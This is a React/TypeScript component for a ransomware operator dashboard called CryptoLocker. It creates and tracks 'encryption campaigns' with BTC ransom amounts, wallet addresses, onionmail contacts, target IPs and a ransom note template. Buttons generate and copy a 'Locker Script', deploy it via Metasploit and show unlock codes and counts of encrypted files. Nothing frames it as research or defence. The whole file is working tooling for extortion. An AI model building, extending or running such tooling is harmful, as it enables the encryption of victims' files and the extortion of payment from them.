"use client";

import { useEffect, useState } from "react";

type CampaignSummary = {
  id: string;
  name: string;
  createdAt: string;
  status: string;
  targets: number;
  filesEncrypted: number;
  deployed: boolean;
  ransomAmount: string;
};

type CampaignDetail = {
  id: string;
  name: string;
  createdAt: string;
  status: string;
  noteTemplate: string;
  deviceNotes: Record<string, string>;
  targets: string[];
  ransomAmount: string;
  walletAddress: string;
  contactEmail: string;
  filesEncrypted: number;
  deployed: boolean;
  unlockCode: string;
  extensions: string[];
};

type LockerStatus = {
  campaignsCount: number;
  keysAvailable: boolean;
  totalFilesEncrypted: number;
};

export function CryptoLocker() {
  const [campaigns, setCampaigns] = useState<CampaignSummary[]>([]);
  const [status, setStatus] = useState<LockerStatus | null>(null);
  const [loading, setLoading] = useState(true);
  const [selectedCampaign, setSelectedCampaign] = useState<CampaignDetail | null>(null);
  const [showCreate, setShowCreate] = useState(false);
  const [showNote, setShowNote] = useState(false);
  const [notePreview, setNotePreview] = useState("");
  const [scriptPreview, setScriptPreview] = useState("");
  const [tab, setTab] = useState<"campaigns" | "create">("campaigns");

  // Form state
  const [form, setForm] = useState({
    name: "",
    ransomAmount: "0.5",
    walletAddress: "bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
    contactEmail: "recovery@onionmail.org",
    targets: "",
    noteTemplate: `=== SYSTEM LOCKED ===\n\nYour files have been encrypted.\nContact: {{EMAIL}}\nID: {{ID}}\n\nAmount: {{AMOUNT}} BTC\nWallet: {{WALLET}}\n\nDevice: {{DEVICE}}\nIP: {{IP}}\n{{CUSTOM_NOTE}}`,
  });

  const fetchData = async () => {
    try {
      const [listRes, statusRes] = await Promise.all([
        fetch("/api/locker?action=list"),
        fetch("/api/locker?action=status"),
      ]);
      const listData = await listRes.json();
      const statusData = await statusRes.json();
      if (listData.campaigns) setCampaigns(listData.campaigns);
      if (statusData) setStatus(statusData);
    } catch { /* ignore */ }
    setLoading(false);
  };

  useEffect(() => { fetchData(); }, []);

  const loadCampaign = async (id: string) => {
    const res = await fetch(`/api/locker?action=get&id=${id}`);
    const data = await res.json();
    if (data.campaign) setSelectedCampaign(data.campaign);
  };

  const handleCreate = async () => {
    try {
      const res = await fetch("/api/locker", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "create",
          name: form.name,
          ransomAmount: form.ransomAmount,
          walletAddress: form.walletAddress,
          contactEmail: form.contactEmail,
          targets: form.targets.split("\n").map((s) => s.trim()).filter(Boolean),
          noteTemplate: form.noteTemplate,
        }),
      });
      const data = await res.json();
      if (data.campaign) {
        await fetchData();
        setShowCreate(false);
        setTab("campaigns");
        loadCampaign(data.campaign.id);
      }
    } catch { /* ignore */ }
  };

  const previewNote = async (campaignId: string) => {
    const res = await fetch(`/api/locker?action=note&id=${campaignId}&ip=192.168.1.100&device=TARGET-PC-01&customNote=Pay+quickly+for+discount`);
    const data = await res.json();
    setNotePreview(data.note || "No note generated");
    setShowNote(true);
  };

  const previewScript = async (campaignId: string) => {
    const res = await fetch(`/api/locker?action=script&id=${campaignId}`);
    setScriptPreview(await res.text());
  };

  const formatDate = (d: string) => new Date(d).toLocaleDateString();

  if (loading) {
    return (
      <div className="flex items-center justify-center py-20">
        <div className="h-8 w-8 animate-spin rounded-full border-2 border-zinc-700 border-t-red-500" />
      </div>
    );
  }

  return (
    <div className="mx-auto max-w-6xl">
      {/* Header */}
      <div className="mb-6 flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-white">CryptoLocker</h1>
          <p className="mt-1 text-sm text-zinc-500">Encryption campaign management — deploy, track, and recover</p>
        </div>
        <div className="flex items-center gap-4">
          {status && (
            <span className="rounded-full border border-zinc-800 bg-zinc-950 px-3 py-1 text-xs text-zinc-500">
              {status.totalFilesEncrypted} files · {status.campaignsCount} campaigns
            </span>
          )}
          <button
            type="button"
            onClick={() => { setTab("create"); setShowCreate(true); }}
            className="rounded-xl bg-red-600 px-4 py-2.5 text-sm font-semibold text-white transition hover:bg-red-500"
          >
            + New Campaign
          </button>
        </div>
      </div>

      {tab === "campaigns" && (
        <div className="grid gap-6 lg:grid-cols-[320px_1fr]">
          {/* Campaign list */}
          <div className="space-y-2">
            <h2 className="text-sm font-semibold uppercase tracking-wider text-zinc-500">
              Campaigns ({campaigns.length})
            </h2>
            {campaigns.length === 0 && (
              <p className="rounded-xl border border-dashed border-zinc-800 p-4 text-center text-sm text-zinc-600">
                No campaigns yet. Create your first one.
              </p>
            )}
            {campaigns.map((c) => (
              <button
                key={c.id}
                type="button"
                onClick={() => { setSelectedCampaign(null); loadCampaign(c.id); }}
                className={`w-full rounded-xl border p-4 text-left transition ${
                  selectedCampaign?.id === c.id
                    ? "border-red-700 bg-red-900/10"
                    : "border-zinc-800 bg-zinc-950/80 hover:border-zinc-700"
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="text-sm font-semibold text-white">{c.name}</span>
                  <span className={`rounded px-2 py-0.5 text-[10px] uppercase ${
                    c.status === "active" ? "bg-red-900/30 text-red-400" :
                    c.status === "decrypted" ? "bg-emerald-900/30 text-emerald-400" :
                    "bg-zinc-800 text-zinc-500"
                  }`}>{c.status}</span>
                </div>
                <p className="mt-1.5 text-xs text-zinc-500">
                  {formatDate(c.createdAt)} · {c.targets} targets · {c.filesEncrypted} files
                </p>
                <p className="text-xs text-zinc-600">{c.ransomAmount} BTC {c.deployed ? "· Deployed" : ""}</p>
              </button>
            ))}
          </div>

          {/* Campaign detail / empty state */}
          <div>
            {!selectedCampaign ? (
              <div className="flex items-center justify-center py-20">
                <p className="text-sm text-zinc-600">Select a campaign to view details</p>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="rounded-2xl border border-zinc-800 bg-zinc-950/80 p-6">
                  <div className="flex items-center justify-between">
                    <h2 className="text-lg font-semibold text-white">{selectedCampaign.name}</h2>
                    <code className="rounded bg-zinc-900 px-2 py-1 font-mono text-xs text-zinc-400">
                      ID: {selectedCampaign.id}
                    </code>
                  </div>

                  <div className="mt-4 grid grid-cols-2 gap-3 text-sm">
                    <div className="rounded-xl border border-zinc-800 bg-black/40 px-4 py-3">
                      <p className="text-xs text-zinc-500">Status</p>
                      <p className="text-zinc-200 capitalize">{selectedCampaign.status}</p>
                    </div>
                    <div className="rounded-xl border border-zinc-800 bg-black/40 px-4 py-3">
                      <p className="text-xs text-zinc-500">Unlock Code</p>
                      <p className="font-mono text-red-400">{selectedCampaign.unlockCode}</p>
                    </div>
                    <div className="rounded-xl border border-zinc-800 bg-black/40 px-4 py-3">
                      <p className="text-xs text-zinc-500">Files Encrypted</p>
                      <p className="text-zinc-200">{selectedCampaign.filesEncrypted}</p>
                    </div>
                    <div className="rounded-xl border border-zinc-800 bg-black/40 px-4 py-3">
                      <p className="text-xs text-zinc-500">Ransom</p>
                      <p className="text-zinc-200">{selectedCampaign.ransomAmount} BTC</p>
                    </div>
                    <div className="rounded-xl border border-zinc-800 bg-black/40 px-4 py-3">
                      <p className="text-xs text-zinc-500">Wallet</p>
                      <p className="font-mono text-xs text-zinc-300 truncate">{selectedCampaign.walletAddress}</p>
                    </div>
                    <div className="rounded-xl border border-zinc-800 bg-black/40 px-4 py-3">
                      <p className="text-xs text-zinc-500">Contact</p>
                      <p className="text-zinc-200">{selectedCampaign.contactEmail}</p>
                    </div>
                  </div>

                  <div className="mt-4 rounded-xl border border-zinc-800 bg-black/40 p-4">
                    <p className="mb-2 text-xs font-semibold uppercase tracking-wider text-zinc-500">Targets</p>
                    {selectedCampaign.targets.length > 0 ? (
                      <div className="flex flex-wrap gap-2">
                        {selectedCampaign.targets.map((t) => (
                          <span key={t} className="rounded bg-zinc-900 px-2 py-1 font-mono text-xs text-zinc-400">{t}</span>
                        ))}
                      </div>
                    ) : (
                      <p className="text-xs text-zinc-600">No specific targets set</p>
                    )}
                  </div>
                </div>

                {/* Actions */}
                <div className="grid grid-cols-4 gap-3">
                  <button
                    type="button"
                    onClick={() => previewNote(selectedCampaign.id)}
                    className="rounded-xl bg-zinc-900 px-4 py-2.5 text-sm text-zinc-300 transition hover:bg-zinc-800 hover:text-white"
                  >
                    Preview Note
                  </button>
                  <button
                    type="button"
                    onClick={() => previewScript(selectedCampaign.id)}
                    className="rounded-xl bg-zinc-900 px-4 py-2.5 text-sm text-zinc-300 transition hover:bg-zinc-800 hover:text-white"
                  >
                    Generate Script
                  </button>
                  <button
                    type="button"
                    className="rounded-xl bg-red-600 px-4 py-2.5 text-sm font-semibold text-white transition hover:bg-red-500"
                  >
                    Deploy via MSF
                  </button>
                  <button
                    type="button"
                    onClick={async () => {
                      await fetch("/api/locker", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ action: "delete", id: selectedCampaign.id }),
                      });
                      setSelectedCampaign(null);
                      fetchData();
                    }}
                    className="rounded-xl border border-red-900/50 px-4 py-2.5 text-sm text-red-400 transition hover:bg-red-900/20"
                  >
                    Delete
                  </button>
                </div>

                {/* Note Preview Modal */}
                {showNote && (
                  <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm">
                    <div className="w-full max-w-2xl rounded-2xl border border-zinc-800 bg-zinc-950 p-6">
                      <div className="mb-4 flex items-center justify-between">
                        <h3 className="text-lg font-semibold text-white">Ransom Note Preview</h3>
                        <button type="button" onClick={() => setShowNote(false)} className="text-zinc-500 hover:text-zinc-300">✕</button>
                      </div>
                      <pre className="max-h-96 overflow-auto whitespace-pre-wrap rounded-xl bg-black p-4 font-mono text-xs leading-relaxed text-red-400/90">
                        {notePreview}
                      </pre>
                    </div>
                  </div>
                )}

                {/* Script Preview */}
                {scriptPreview && (
                  <div className="rounded-2xl border border-zinc-800 bg-zinc-950/80 p-4">
                    <div className="mb-3 flex items-center justify-between">
                      <h3 className="text-xs font-semibold uppercase tracking-wider text-zinc-500">Locker Script</h3>
                      <button
                        type="button"
                        onClick={() => {
                          navigator.clipboard.writeText(scriptPreview);
                        }}
                        className="text-xs text-zinc-500 hover:text-zinc-300"
                      >
                        Copy
                      </button>
                    </div>
                    <pre className="max-h-96 overflow-auto whitespace-pre-wrap rounded-xl bg-black p-4 font-mono text-xs text-emerald-400/80">
                      {scriptPreview}
                    </pre>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Create Campaign */}
      {tab === "create" && (
        <div className="mx-auto max-w-2xl space-y-6">
          <div className="rounded-2xl border border-zinc-800 bg-zinc-950/80 p-6">
            <h2 className="text-lg font-semibold text-white">New Encryption Campaign</h2>
            <p className="mb-6 text-sm text-zinc-500">Configure the locker campaign parameters</p>

            <div className="space-y-4">
              <div>
                <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">Campaign Name</label>
                <input type="text" value={form.name} onChange={(e) => setForm({ ...form, name: e.target.value })}
                  placeholder="e.g. Client-Audit-2026" className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none" />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">Ransom Amount (BTC)</label>
                  <input type="text" value={form.ransomAmount} onChange={(e) => setForm({ ...form, ransomAmount: e.target.value })}
                    placeholder="0.5" className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none" />
                </div>
                <div>
                  <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">Wallet Address</label>
                  <input type="text" value={form.walletAddress} onChange={(e) => setForm({ ...form, walletAddress: e.target.value })}
                    className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none" />
                </div>
              </div>

              <div>
                <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">Contact Email</label>
                <input type="text" value={form.contactEmail} onChange={(e) => setForm({ ...form, contactEmail: e.target.value })}
                  placeholder="recovery@onionmail.org" className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none" />
              </div>

              <div>
                <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">Target IPs / Devices (one per line)</label>
                <textarea value={form.targets} onChange={(e) => setForm({ ...form, targets: e.target.value })}
                  rows={4} placeholder="192.168.1.100&#10;192.168.1.101&#10;CORP-MAIL-01"
                  className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none" />
              </div>

              <div>
                <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">Ransom Note Template</label>
                <p className="mb-2 text-xs text-zinc-600">
                  Available placeholders: {'{{ID}}, {{EMAIL}}, {{AMOUNT}}, {{WALLET}}, {{DEVICE}}, {{IP}}, {{FILE_COUNT}}, {{DATE}}, {{CUSTOM_NOTE}}'}
                </p>
                <textarea value={form.noteTemplate} onChange={(e) => setForm({ ...form, noteTemplate: e.target.value })}
                  rows={12}
                  className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 font-mono text-xs text-zinc-200 focus:border-red-700 focus:outline-none" />
              </div>
            </div>

            <div className="mt-6 flex gap-3">
              <button type="button" onClick={() => { setTab("campaigns"); setShowCreate(false); }}
                className="flex-1 rounded-xl bg-zinc-900 py-3 text-sm text-zinc-300 hover:bg-zinc-800">
                Cancel
              </button>
              <button type="button" onClick={handleCreate}
                className="flex-1 rounded-xl bg-red-600 py-3 text-sm font-semibold text-white hover:bg-red-500">
                Create Campaign
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
